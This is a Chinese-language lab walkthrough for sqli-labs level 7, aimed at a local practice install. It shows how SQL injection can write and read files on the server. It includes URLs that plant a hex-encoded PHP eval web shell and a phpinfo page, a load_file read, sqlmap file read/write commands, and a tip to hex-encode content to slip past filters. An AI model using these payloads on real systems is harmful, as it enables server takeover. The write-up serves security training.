---
 title: Sqlilabs通关笔记(7)读写注入
 date: 2020-01-04 09:34:26
 tags: SQL注入
 categories:
---


## 第七关 基于文件写入注入
![2020-1-5-8-11-29](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-5-8-11-29)

### 存在注入点判断
1. 任意输入单引号，会显示报错
2. 正常运行提示 Use outfile...... 所以理解为写入mm文件执行
3. 通过尝试发现闭合'))，通过查看源代码，再次确定闭合成功

    ```
        $sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
    $result=mysql_query($sql);
    $row = mysql_fetch_array($result);

        if($row)
        {
        echo '<font color= "#FFFF00">';	
        echo 'You are in.... Use outfile......';
        echo "<br>";
        echo "</font>";
        }
        else 
        {
        echo '<font color= "#FFFF00">';
        echo 'You have an error in your SQL syntax';
        //print_r(mysql_error());
        echo "</font>";  
        }
    }
        else { echo "Please input the ID as parameter with numeric value";}

    ```
<!--more-->
### 写入文件配置（使用条件）

**secure-file-priv**
    - 如果文件导入不成功,确认Mysql配置文件my.ini下存在secure-file-priv
    - secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的

* secure_file_priv的值为null ，表示限制mysqld不允许导入|导出
* secure_file_priv的值为/tmp/ ，表示限制mysqld的导入|导出只能发生在/tmp/目录下
* secure_file_priv的值没有具体值时，表示不对mysqld的导入|导出做限制

mysql使用以下命令查看是否打开文件写入开关
> show global variables like '%secure%'

![2020-1-5-9-9-4](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-5-9-9-4)

修改my.ini添加secure-file-priv参数,没有填具体值表示不做限制(这样做其实很危险)
![2020-1-5-9-9-20](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-5-9-9-20)

重启mysql即可

### 写入敏感文件

写入一句话木马
> http://127.0.0.1/sqlilabs2/Less-7/index.php?id=-1')) union select 1,0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e,3 into outfile "E:\\softs\\phpstudy_pro\\WWW\\sqlilabs2\\Less-7\\mm2.php"--+

写入phpinfo
> http://127.0.0.1/sqlilabs2/Less-7/index.php?id=1')) 1,0x3c3f70687020706870696e666f28293b3f3e,3 into outfile "E:\\softs\\phpstudy_pro\\WWW\\sqlilabs2\\Less-7\\pp2.php--+

**写入需要注意的**
* 写入的内容需要用hex转码，以防拦截
* 写入的前提需要知道物理文件路径
* 写入的前提是有权限写入，或者有配置写入的权限

**可以在文件目录查看发现文件写入成功**

![2020-1-5-9-9-49](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-5-9-9-49)

**同时网页可以直接访问该文件并执行**

![2020-1-5-9-10-10](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-5-9-10-10)


### 读取敏感文件
- **前提要有页面输出哦！**
> http://127.0.0.1/sqlilabs2/Less-3/index.php?id=-1') union select 1,load_file('e:\\mm.php'),3--+



### SQLMQP 读写文件

**文件读取**

> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-1/index.php?id=1" --file-read "E:\\mm.php"

**文件写入**
> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-7/index.php?id=1" --file-write "/home/bb/1.txt" --file-dest "E:\\sql2.php" --batch